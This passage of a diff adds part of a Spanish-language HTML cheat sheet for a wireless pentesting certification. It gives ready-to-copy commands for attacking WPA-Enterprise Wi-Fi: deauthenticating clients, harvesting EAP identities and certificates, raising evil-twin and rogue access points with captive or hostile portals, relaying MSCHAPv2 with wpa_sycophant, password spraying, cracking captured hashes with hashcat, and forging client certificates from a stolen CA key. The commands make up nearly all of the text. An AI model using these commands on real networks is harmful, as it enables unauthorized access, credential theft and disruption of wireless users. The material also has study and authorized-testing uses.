+<span class="comment"># Desautenticar al cliente del AP leg&iacute;timo (802.11w deshabilitado)</span>
+sudo iwconfig wlan0mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng wlan0mon -0 0 -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt;
+
+<span class="comment"># Convertir y crackear</span>
+hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
+hcxpcapngtool aux.pcap -o hash.22000
+hashcat -a 0 -m 22000 hash.22000 &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+</div>
+
+<!-- 10 MGT RECON -->
+<div class="section-block reveal" id="mgtrecon">
+    <div class="section-number">// 10</div>
+    <h2>MGT <span class="accent">Recon</span></h2>
+
+    <h3>Identity Harvesting (Captura de Identidades EAP)</h3>
+    <div class="note">En EAP-TTLS o PEAP, el cliente env&iacute;a su identidad (usuario) en el mensaje EAP-Response/Identity ANTES del t&uacute;nel TLS, exponi&eacute;ndola a interceptaci&oacute;n.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Modo monitor y captura</span>
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon -w &lt;OUTPUT&gt; --gpsd --band abg
+
+<span class="comment"># Capturar solo en el canal del objetivo</span>
+sudo airodump-ng wlan0mon -w &lt;OUTPUT&gt; -c &lt;CHANNEL&gt;
+
+<span class="comment"># Abrir captura en Wireshark y filtrar por EAP</span>
+<span class="comment"># Filtro: eap para encontrar EAP-Response/Identity</span></pre></div>
+    </div>
+
+    <h3>Recolecci&oacute;n de Certificados TLS</h3>
+    <div class="note">Ataque pasivo: captura certificados TLS transmitidos durante la fase inicial de autenticaci&oacute;n para extraer informaci&oacute;n &uacute;til (CN, O, OU, etc.).</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Capturar tr&aacute;fico del canal objetivo</span>
+sudo airodump-ng wlan0mon -w &lt;OUTPUT&gt; -c &lt;CHANNEL&gt;
+
+<span class="comment"># Extraer certificados con pcapFilter</span>
+bash pcapFilter.sh -f &lt;CAPTURE&gt;.cap -C
+
+<span class="comment"># Alternativa con Wireshark</span>
+<span class="comment"># Filtro: (wlan.sa == &lt;AP_MAC&gt;) &amp;&amp; (tls.handshake.certificate)</span></pre></div>
+    </div>
+
+    <h3>Enumeraci&oacute;n de M&eacute;todos EAP</h3>
+    <div class="note">EAP_buster env&iacute;a solicitudes de autenticaci&oacute;n al AP con diferentes tipos de EAP (PEAP, EAP-TTLS, EAP-MD5, EAP-TLS) y registra cu&aacute;les son aceptados.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Enumerar m&eacute;todos EAP soportados</span>
+bash ./EAP_buster.sh &lt;TARGET_SSID&gt; '&lt;DOMAIN&gt;\&lt;USER&gt;' &lt;IFACE&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 11 MGT - EVIL TWIN & MITM -->
+<div class="section-block reveal" id="mgteviltwin">
+    <div class="section-number">// 11</div>
+    <h2>MGT - <span class="accent">Evil Twin &amp; MiTM</span></h2>
+
+    <h3>Crear Certificado Falso para el AP</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Obtener campos del certificado original</span>
+bash pcapFilter.sh -C -f &lt;CAPTURE&gt;.cap
+
+<span class="comment"># Crear certificado falso con eaphammer</span>
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard</pre></div>
+    </div>
+
+    <h3>Levantar AP Falso (Evil Twin Enterprise)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Levantar AP falso con eaphammer</span>
+python3 ./eaphammer -i &lt;IFACE&gt; --auth wpa-eap --essid &lt;TARGET_SSID&gt;</pre></div>
+    </div>
+
+    <h3>Desautenticar Clientes del AP Leg&iacute;timo</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SHELL 1 - Deauth desde interfaz 1</span>
+sudo airmon-ng start wlan0
+sudo iwconfig wlan0mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng -0 0 -a &lt;AP_BSSID&gt; wlan0mon -c &lt;CLIENT_MAC&gt;
+
+<span class="comment"># SHELL 2 - Deauth desde interfaz 2 (otro BSSID si existe)</span>
+sudo airmon-ng start wlan1
+sudo iwconfig wlan1mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng -0 0 -a &lt;AP_BSSID_2&gt; wlan1mon -c &lt;CLIENT_MAC&gt;</pre></div>
+    </div>
+
+    <h3>Cracking de Credenciales MSCHAPv2</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Una vez el cliente se conecta al AP falso, se capturan hashes MSCHAPv2</span>
+<span class="comment"># Formato: user::::challenge:response</span>
+
+<span class="comment"># Crackear con hashcat</span>
+hashcat -a 0 -m 5500 &lt;HASH_FILE&gt; &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+
+    <h3>Conexi&oacute;n a la Red con Credenciales Obtenidas</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo de configuraci&oacute;n PEAP</span>
+network={
+    ssid="&lt;TARGET_SSID&gt;"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    anonymous_identity="&lt;DOMAIN&gt;\anonymous"
+    identity="&lt;DOMAIN&gt;\&lt;USER&gt;"
+    password="&lt;PASSWORD&gt;"
+    phase1="peapver=1"
+    phase2="auth=MSCHAPV2"
+}
+
+<span class="comment"># Conectarse</span>
+sudo wpa_supplicant -i &lt;IFACE&gt; -c &lt;CONFIG_FILE&gt;
+sudo dhclient &lt;IFACE&gt; -v</pre></div>
+    </div>
+</div>
+
+<!-- 12 MGT - BRUTE FORCE & SPRAYING -->
+<div class="section-block reveal" id="mgtbrute">
+    <div class="section-number">// 12</div>
+    <h2>MGT - <span class="accent">Brute Force &amp; Spraying</span></h2>
+
+    <h3>Fuerza Bruta con Air-Hammer</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Crear archivo de usuario</span>
+echo '&lt;DOMAIN&gt;\&lt;USER&gt;' &gt; target.user
+
+<span class="comment"># Fuerza bruta con air-hammer</span>
+./air-hammer.py -i &lt;IFACE&gt; -e &lt;TARGET_SSID&gt; -p &lt;WORDLIST&gt; -u target.user</pre></div>
+    </div>
+
+    <h3>Password Spraying con Air-Hammer</h3>
+    <div class="note">Probar una &uacute;nica contrase&ntilde;a contra m&uacute;ltiples usuarios. Ideal para explotar contrase&ntilde;as d&eacute;biles compartidas.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Crear diccionario de usuarios con dominio</span>
+cat &lt;USERLIST&gt; | awk '{print "&lt;DOMAIN&gt;\\" $1}' &gt; users-domain.txt
+
+<span class="comment"># Password spraying con air-hammer</span>
+./air-hammer.py -i &lt;IFACE&gt; -e &lt;TARGET_SSID&gt; -P &lt;PASSWORD&gt; -u users-domain.txt</pre></div>
+    </div>
+
+    <h3>Password Spraying con EAPHammer</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Password spraying con m&uacute;ltiples interfaces</span>
+./eaphammer --eap-spray \
+    --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
+    --essid &lt;TARGET_SSID&gt; \
+    --password &lt;PASSWORD&gt; \
+    --user-list users-domain.txt \
+    | grep -aE 'FOUND ONE|Trying credentials'</pre></div>
+    </div>
+</div>
+
+<!-- 13 MGT - RELAY ATTACKS -->
+<div class="section-block reveal" id="mgtrelay">
+    <div class="section-number">// 13</div>
+    <h2>MGT - <span class="accent">Relay Attacks</span></h2>
+
+    <div class="note">Explota protocolos challenge-response como MSCHAPv2. El atacante act&uacute;a como intermediario entre el cliente y el AP, reenviando desaf&iacute;os y respuestas para autenticarse con el AP real.</div>
+
+    <h3>Preparar MAC del AP Falso</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Cambiar MAC para simular AP leg&iacute;timo</span>
+sudo systemctl stop network-manager
+sudo airmon-ng stop wlan1mon
+sudo ip link set wlan1 down
+sudo macchanger -m &lt;AP_MAC&gt; wlan1
+sudo ip link set wlan1 up</pre></div>
+    </div>
+
+    <h3>Configurar wpa_sycophant</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo wpa_sycophant_example.conf</span>
+network={
+    ssid="&lt;TARGET_SSID&gt;"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    identity=""
+    anonymous_identity=""
+    password=""
+    eap=PEAP
+    phase1="crypto_binding=0 peaplabel=0"
+    phase2="auth=MSCHAPV2"
+    bssid_blacklist=&lt;ROGUE_AP_MAC&gt;
+}</pre></div>
+    </div>
+
+    <h3>Ejecutar Relay Attack (3 Shells)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SHELL 1 - Levantar Rogue AP con berate_ap</span>
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant \
+    --mana-credout outputMana.log \
+    wlan1 lo &lt;TARGET_SSID&gt;
+
+<span class="comment"># SHELL 2 - Ejecutar wpa_sycophant para reenviar credenciales</span>
+cd ~/tools/wpa_sycophant/
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i &lt;RELAY_IFACE&gt;
+
+<span class="comment"># SHELL 3 - Desautenticar clientes del AP leg&iacute;timo</span>
+sudo airmon-ng start wlan0
+sudo iwconfig wlan0mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng -0 0 wlan0mon -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt;</pre></div>
+    </div>
+
+    <h3>Validar Conexi&oacute;n</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Cuando aparezca CTRL-EVENT-CONNECTED en wpa_sycophant</span>
+sudo dhclient &lt;RELAY_IFACE&gt; -v</pre></div>
+    </div>
+
+    <h3>Relay Attack - Active Directory (Cross-Network)</h3>
+    <div class="note">Aprovecha la diferencia en permisos entre redes menos seguras y m&aacute;s restringidas para escalar privilegios o acceder a recursos internos vinculados al mismo AD.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Mismo proceso pero apuntando wpa_sycophant a la red restringida</span>
+<span class="comment"># En el conf, cambiar ssid a la red con m&aacute;s permisos:</span>
+network={
+    ssid="&lt;RESTRICTED_SSID&gt;"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    identity=""
+    anonymous_identity=""
+    password=""
+    eap=PEAP
+    phase1="crypto_binding=0 peaplabel=0"
+    phase2="auth=MSCHAPV2"
+    bssid_blacklist=&lt;ROGUE_AP_MAC&gt;
+}
+
+<span class="comment"># El Rogue AP emula la red menos segura</span>
+./berate_ap --eap --mana-wpe --wpa-sycophant \
+    --mana-credout outputMana.log \
+    wlan1 lo &lt;LESS_SECURE_SSID&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 14 MGT - ROGUE AP & CERTIFICATES -->
+<div class="section-block reveal" id="mgtrogue">
+    <div class="section-number">// 14</div>
+    <h2>MGT - <span class="accent">Rogue AP &amp; Certificates</span></h2>
+
+    <h3>Rogue AP + Captive Portal (Phishing)</h3>
+    <div class="note">La red principal usa EAP-TLS (certificados de cliente). Se identifican redes abiertas buscadas por clientes (Probes) y se simula un Rogue AP con portal cautivo.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SHELL 1 - Crear AP malicioso con portal cautivo</span>
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+./eaphammer --essid &lt;PROBE_SSID&gt; --interface &lt;IFACE&gt; --captive-portal
+
+<span class="comment"># SHELL 2 - Desautenticar al cliente</span>
+sudo iwconfig wlan0mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng -0 0 wlan0mon -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt;
+
+<span class="comment"># Credenciales aparecen en la consola de eaphammer</span></pre></div>
+    </div>
+
+    <h3>Rogue AP + Hostile Portal (Responder)</h3>
+    <div class="note">En lugar de solicitar credenciales directamente, se usa Responder para capturar hashes NTLMv2 al interactuar con servicios del portal hostil.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># SHELL 1 - Rogue AP con Hostile Portal</span>
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+./eaphammer --essid &lt;PROBE_SSID&gt; --interface &lt;IFACE&gt; --hostile-portal
+
+<span class="comment"># SHELL 2 - Desautenticar al cliente</span>
+sudo airmon-ng start wlan0
+iwconfig wlan0mon channel &lt;CHANNEL&gt;
+aireplay-ng -0 0 wlan0mon -a &lt;AP_BSSID&gt; -c &lt;CLIENT_MAC&gt;
+
+<span class="comment"># Extraer y crackear hashes NTLMv2</span>
+cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' &gt; responder.5600
+hashcat -a 0 -m 5600 responder.5600 &lt;WORDLIST&gt; --force</pre></div>
+    </div>
+
+    <h3>Rogue AP con Certificados del AP Leg&iacute;timo</h3>
+    <div class="note">Con acceso a los certificados del AP leg&iacute;timo, se puede enga&ntilde;ar a clientes que verifican el certificado del AP antes de conectarse.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Importar certificados leg&iacute;timos en eaphammer</span>
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard import \
+    --server-cert &lt;SERVER_CERT&gt; \
+    --ca-cert &lt;CA_CERT&gt; \
+    --private-key &lt;SERVER_KEY&gt; \
+    --private-key-passwd &lt;KEY_PASSWORD&gt;
+
+<span class="comment"># SHELL 1 - Levantar AP malicioso</span>
+python3 ./eaphammer -i &lt;IFACE&gt; --auth wpa-eap --essid &lt;TARGET_SSID&gt;
+
+<span class="comment"># SHELL 2 &amp; 3 - Desautenticar clientes</span>
+sudo airmon-ng start wlan0
+sudo iwconfig wlan0mon channel &lt;CHANNEL&gt;
+sudo aireplay-ng -0 0 -a &lt;AP_BSSID&gt; wlan0mon -c &lt;CLIENT_MAC&gt;</pre></div>
+    </div>
+
+    <h3>Alternativa con berate_ap + Certificados</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Convertir certificados a formato PEM</span>
+openssl x509 -in ca.crt -out hostapd.ca.pem -outform PEM
+openssl x509 -in server.crt -out hostapd.cert.pem -outform PEM
+openssl rsa -in server.key -out hostapd.key.pem
+openssl dhparam -out hostapd.dh.pem 2048
+
+<span class="comment"># Levantar Rogue AP con berate_ap</span>
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant \
+    --mana-credout outputMana.log \
+    &lt;IFACE&gt; lo &lt;TARGET_SSID&gt; \
+    --eap-cert-path &lt;CERT_DIR&gt;/</pre></div>
+    </div>
+
+    <h3>Generar Certificado de Cliente (EAP-TLS)</h3>
+    <div class="note">Con archivos del CA leg&iacute;timo y un usuario conocido, se genera un certificado de cliente v&aacute;lido para conectarse directamente al AP leg&iacute;timo.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Generar clave privada del cliente</span>
+openssl genrsa -out client.key 2048
+
+<span class="comment"># Crear solicitud de firma (CSR)</span>
+openssl req -config client.conf -new -key client.key -out client.csr
+
+<span class="comment"># Firmar certificado con el CA</span>
+openssl x509 -days 730 -extfile client.ext \
+    -CA ca.crt -CAkey ca.key -CAserial ca.serial \
+    -in client.csr -req -out client.crt</pre></div>
+    </div>
+
+    <h3>Conexi&oacute;n con Certificado EAP-TLS</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">Bash</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Archivo wpa_tls.conf</span>
+network={
+    ssid="&lt;TARGET_SSID&gt;"
+    scan_ssid=1
+    mode=0
+    proto=RSN
+    key_mgmt=WPA-EAP
+    auth_alg=OPEN
+    eap=TLS
+    identity="&lt;DOMAIN&gt;\&lt;USER&gt;"
+    ca_cert="./ca.crt"
+    client_cert="./client.crt"
+    private_key="./client.key"
+    private_key_passwd="&lt;KEY_PASSWORD&gt;"
+}
+
+<span class="comment"># Conectarse al AP con certificado</span>
+sudo wpa_supplicant -i &lt;IFACE&gt; -c wpa_tls.conf
+sudo dhclient &lt;IFACE&gt; -v</pre></div>
+    </div>
+</div>
+
+</main>
+</div>
+
+<!-- Back to top -->
+<a href="#" class="back-top" id="backTop">&uarr;</a>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-inner">
+        <a href="/" class="footer-brand">GUARINA0x0</a>
+        <span class="footer-sep">&bull;</span>
+        <span>CWP Cheatsheet</span>
+        <span class="footer-sep">&bull;</span>
+        <span>&copy; 2026</span>
+        <span class="footer-sep">&bull;</span>
+        <div class="footer-social">
+            <a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+            </a>
+            <a href="https://www.linkedin.com/in/antonio-gallego-l%C3%B3pez-14047b1bb/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+            </a>
+            <a href="https://x.com/Guarina0x0" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </a>
+        </div>
+    </div>
+    <p class="footer-dimension">Transmitiendo desde la Dimensi&oacute;n C-137</p>
+</footer>
+
+<!-- Search Modal -->
+<div class="search-overlay" id="searchOverlay">
+    <div class="search-modal">
+        <div class="search-input-wrap">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <input type="text" class="search-input" id="searchInput" placeholder="Search commands..." autocomplete="off" spellcheck="false" aria-label="Buscar comandos">
+            <span class="search-result-count" id="searchCount"></span>
+            <span class="search-close-hint">ESC</span>
+        </div>
+        <div class="search-filters" id="searchFilters">
+            <div class="filter-row">
+                <button class="filter-chip active" data-sheet="all">All</button>
+                <button class="filter-chip" data-sheet="CRTE">CRTE</button>
+                <button class="filter-chip" data-sheet="CRTO">CRTO</button>
+                <button class="filter-chip" data-sheet="CWP">CWP</button>
+                <button class="filter-chip" data-sheet="CARTP">CARTP</button>
+            </div>
+            <div class="filter-row">
+                <button class="filter-chip lang active" data-lang="all">All Langs</button>
+                <button class="filter-chip lang" data-lang="PowerShell">PowerShell</button>
+                <button class="filter-chip lang" data-lang="Bash">Bash</button>
+                <button class="filter-chip lang" data-lang="CMD">CMD</button>
+                <button class="filter-chip lang" data-lang="Cobalt Strike">Cobalt Strike</button>
+            </div>
+        </div>
+        <div class="search-results" id="searchResults">
+            <div class="search-empty">Type to search commands across all cheatsheets...</div>
+        </div>
+        <div class="search-footer">
+            <span><kbd>&uarr;&darr;</kbd> Navigate</span>
+            <span><kbd>&crarr;</kbd> Open</span>
+            <span><kbd>esc</kbd> Close</span>
+        </div>
+    </div>
+</div>
+
+<script src="search-index.js"></script>
+<script src="main.js"></script>
+
+</body>
+</html>
